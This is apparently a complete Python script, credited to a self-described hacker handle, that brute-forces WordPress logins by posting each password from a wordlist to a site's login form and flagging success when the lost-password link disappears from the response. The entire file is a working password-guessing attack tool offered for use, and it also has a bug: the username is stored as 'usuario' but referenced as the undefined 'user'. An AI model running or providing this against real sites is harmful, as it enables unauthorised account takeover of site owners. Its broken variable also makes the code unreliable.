"""
codado por D
twt: dcodeeee
ttk: onlydhacker

"""

import requests as r

print('Bruteforce WP by D')
url = input("URL (link do site): ")
usuario = input("User: ")
wordlist = input("Wordlist (arquivo.txt): ") ; wordlist =open(wordlist, "r").readlines()
wordlist = [x.replace ("\n", "") for x in wordlist]

xmenu = """
[+] Site: {}
[+] User: {}
""".format(url, user)
print(xmenu)

for senha in wordlist:
    payload = {"log" : user,
               "pwd" : senha}
    envia = r.post(url, data=payload).text
    if "wp-login.php?action=lostpassword" in envia:
        print("senha errada => {}".format(senha))
    else:
        print("senha correta => {}".format(senha))
        exit()

print("finalizar, @onlydhacker on ttk <3")